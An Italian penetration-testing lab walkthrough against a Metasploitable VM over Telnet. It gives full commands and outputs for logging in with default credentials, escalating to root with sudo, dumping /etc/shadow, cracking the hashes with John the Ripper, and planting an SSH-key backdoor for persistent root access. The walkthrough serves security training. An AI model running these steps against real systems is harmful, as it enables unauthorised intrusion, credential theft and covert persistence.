# porta 23 Telnet
Il protocollo Telnet è uno dei servizi più datati della rete. È nato per fornire un'interfaccia a riga di comando per gestire i server da remoto, ma ha due enormi problemi strutturali se confrontato con SSH Mancanza di cifratura: Tutto il traffico (inclusi i nomi utente e le password) viaggia in chiaro sulla rete sotto forma di testo semplice Configurazioni storicamente deboli: Spesso, sui sistemi didattici o industriali datati, il servizio Telnet accettava credenziali di default o non richiedeva alcuna autenticazione per determinati account di manutenzione

Per sfruttare le vulnerabilità di questa porta come prima cosa utilizziamo il metodo nativo integrato di Telnet creando una connessione con la macchina vulnerabile tramite il comando :

- telnet 192.168.56.102
  - non serve specificare la porta poiche di default utilizza la porta 23

ci verra restituito un ASCII art cone le varie informazioni legate alla connessione stabilità e le credenziali per login inseriamo quindi nel campo di login che si è aperto alla fine della schermata le credenziali necessarie una volta fatto questo possiamo utilizzare i comandi visti in precedenza per verifica il nome dell'account con cui siamo collegati " whoami " l'id di appartenenza " id " e la versione di sistema " uname -a " per semplificare questo processo useremo l'operatore " && " che svolge i comandi uno per uno indipendentemente dalla riuscita del comando precedente

- whoami && uname -a && id

riceveremo un output di questo genere:

msfadmin@metasploitable:~$ whoami && uname -a && id
msfadmin
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin)

la prima linea di result ci conferma che l'utente a cui siamo attualmente loggati è " msfadmin " la seconda linea le informazioni di sistema e la terza linea al momento per noi la piu importante ci da informazioni su quanto riguarda le autorizzazione di questo profilo sappiamo pertanto che l' "uid = 1000 " ed appartiene al "groups=4(adm), 112(admin) " quidni rientra tra gli utenti che posso eseguire anche codice da amministratore per fare questo ci basta fare una semplice verifica sfruttando il comando per ottenere i permessi da amministratore supremo lanciamo quindi :

- sudo su

subito dopo ci verra richiesto di inserire nuovamente la password "msfadmin" e se tutto è corretto vedremo nella stringa iniziale del terminale che sarà cambiata in "root@metaesploitable..." il che ci conferma che siamo riusciti a fare una privilege escalation da normale user a root user ora sfrutteremo queste autorizzazione per estrapolare informazioni utili sugli utenti presenti nel file shadow utilizziamo il comando " cat /etc/shadow " 

- cat /etc/shadow
  - cat sta per concatenate e sempre a stampare a schermo il contenuto di un file di testo
  - /etc/shadow è la cartella ed il file di nostro interesse che con l'utente service non potevamo aprire poiche non aveva i permessi necessari

avremo un risultato a schermo simile a questo:

root@metasploitable:/home/msfadmin# cat /etc/shadow
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
daemon:*:14684:0:99999:7:::
bin:*:14684:0:99999:7:::
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
sync:*:14684:0:99999:7:::
log:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
sshd:*:14684:0:99999:7:::
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
bind:*:14685:0:99999:7:::
postfix:*:14685:0:99999:7:::
ftp:*:14685:0:99999:7:::
postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::

questi sono nomi utenti con password abbinate hashate per esempio utente root:[password_hashata] ... sys:[password_hashata] ... ci sono anche degli utenti di servizio con i quali non è possibile effettuare il login e che non hanno password come  daemon:*:14684:0:99999:7:::  ...  bin:*:14684:0:99999:7::: ... La cosa piu interessante per noi è capire come è strutturato l'hash della password come detto anche in precedenza i " : " vengono utilizzati come separatore logico tra stringhe quindi prendendo in esempio un utente :

- root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
  - root è il nome utente
  - : termina il nome utente e da qui in poi inizia la password con hash
  - $1$ il numero indica la tipologia di hash 1= MD5-Crypt 5=SHA-256
  - $1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid. questo è l'hash della password
  - : termina l'hash della password ed iniziano le regole di password aging
  - 14747 Data dell'ultimo cambio password in giorni
  - : fine della regola che esplicita la data di cambio
  - 0 regola che specifica quanti giorni devono passare prima di poter fare un cambio
  - : fine regola giorni minimi per cambio password
  - 99999 indica per quanto tempo la password è considerata affidabile
  - : fine regola affidabilità
  - 7 il numero di giorni di preavviso dai quali parte il banner per il cambio
  - ::: all'interno di ogni : potrebbe essere scritta una regola avanzata per la password che però ad oggi in questo sistema sono vuote

creiamo un file di testo contenente il nome utente:password_hashata che per esempio chiameremo hash.txt apriamo un nuovo terminale rechiamoci nella cartella in cui abbiamo creato il file e lanciamo il comando :

- john hash.txt
    - possiamo aggiungere un opzione (--) per dire al software john di usare una wordlist personalizzata
      - john --wordlist=/percorso/della/wordlists/nome/file.txt
      - OMP_NUM_THREADS=2 john ... questa opzione dice al software john di utilizzare solo 2 threads cosi da non bloccarci la macchina 

limitando il numero di cpu non si blocchera la macchina virtuale e il compito di john the ripper sarà portato a termine ora per avere a disposizione sempre le password possiamo utilizzare il comando per mostrarle e salvarle in un altro file

- john --show hash.txt > password_violate.txt
  - --show è l'opzione per mostrare i rusiltati di..
  - hash.txt che è il file su cui ha lavorato
  - " > " operatore di reindirizzamento dice di non salvare i risultati sullo schermo ma di creare un nuovo file o sovrascriverne uno gia esistente scrivendoci dentro i risultati
  - password_violate.txt è il nuovo file che vogliamo creare dove salvarci i dati

la password di root non è decriptabile poiche continene all'interno un carattere speciale dovuto ad un errore di battitura durante la creazione stessa della password di fatto scrivendo "krypton" la tastiera impostato su linguaggio kanji ha inserito automaticamente un simbolo non identificabile pertanto visto che siamo amministratori supremi dopo aver usato il comando "sudo su" potremmo anche cambiare quella password con il comando 

- passwd root
  - ci chiedera di inserire una nuova password

ma avendo già i permessi da amministratore non è importante per noi farlo l'importante è aver dimostrato di poter utilizzare una falla per esfiltrare credenziali e compromettere il server in questo caso andremo a creare una backdoor per utilizzarla in futuro

Nell'ambito del penetration testing e delle attività di red teaming, la creazione di una backdoor (o persistenza) serve a dimostrare come un attaccante, una volta ottenuti i privilegi di amministratore, possa mantenere l'accesso al sistema anche se le password principali venissero cambiate o i servizi standard venissero riavviati

## Persistenza tramite Chiave Pubblica SSH
generare una coppia di chiavi crittografiche (una privata che rimarrà segreta su Kali e una pubblica che inseriremo nel server) per farlo apriremo un nuovo terminale sulla nsotra macchina kali linux ed eseguiremo il comando :

- ssh-keygen -t rsa -b 4096
  - ssh-keygen è il comando di generazione della chiave
  - -t rsa indica quale algoritmo utilizzare
  - -b 4096 indica la lunghezza della chiave in bit 

dopo questo comando ci verra mostrata una richiesta per il salvataggio del file in un percorso specifico che possiamo anche cambiare ma possiamo anche premere invio e usare il percorso standard " /home/kali/.ssh/id_rsa " successivamente ci viene richiesto l'inserimento di una passphrase che possiamo anch'essa lasciare vuota per per accedere in maniera piu veloce in futuro ora dobbiamo leggere la key generata utilizzando il percorso che ci viene indicato nella riga subito sopra l'hash e utilizzero nuovamente il comando cat :

- cat [percorso_scelto]
  - cat /home/kali/.ssh/id_rsa.pub nel mio caso

ci verra mostrata una stringa lunga questa stringa è la nostra public key ora dobbiamo inserirla nel file delle key autorizzate per farlo ci muoveremo nella cartella contente le chiavi:

- ls -a per mostrare i file anche nascosti della directory in cui siamo
- cd [nome cartella] per entrare nella directory che ci interessa
- cat > authorized_keys per far si che possiamo "appendere" in fondo alla lista la nostra public key che inizia con ssh e finisce con il nome della nostra macchina

una volta fatto questo andiamo a capo di una riga per staccarci da possibili stringhe e premiamo ctrl + d per salvare il file ora non ci resta che blindare con permessi restrittivi la cartella .ssh e il file authorized_key per farlo utilizziamo i comandi:

- chmod 700 /root/.ssh solo utente root può entrare/modificare/leggere
- chmod 600 /root/.ssh/authorized_keys solo l'utente root puo leggere/modificare
  
Il comando chmod (abbreviazione di change mode) è lo strumento fondamentale in Linux per gestire i permessi di file e cartelle per verificare i permessi possiamo lanciare il comando " ls -l " il server SSH applica una politica di sicurezza ultra-rigida chiamata "StrictModes" se nota che una cartella specifica o il file hanno una politica troppo permissiva manda in allarme il sistema e blocca la connessione

ultima verifica fondamentale creiamo su un nuovo terminale una connessione ssh utilizzando il comando:

- ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa root@192.168.56.102
  - ssh tipologia di connessione
  - -o HostKeyAlgorithms=+ssh-rsa per accettare l'utilizzo di vecchi algoritmi RSA
  - -o PubkeyAcceptedKeyTypes=+ssh-rsa per inviare la public key con vecchi algoritmi RSA
  - root nome utente
  - 192.168.56.102 macchina su cui abbiamo iniettato la backdoor di accesso

ora come possiamo notare la stringa del terminale mostra l'utente root della macchina metaesploitable senza averci richiesto nemmeno la password di accesso abbiamo di fatto inserito all'intenro del server un punto di accesso che possiamo sfruttare per entrare nel server quando vogliamo senza bisogno di credenziali specifiche ma solo grazie alla nostra public key della nostra macchina kali linux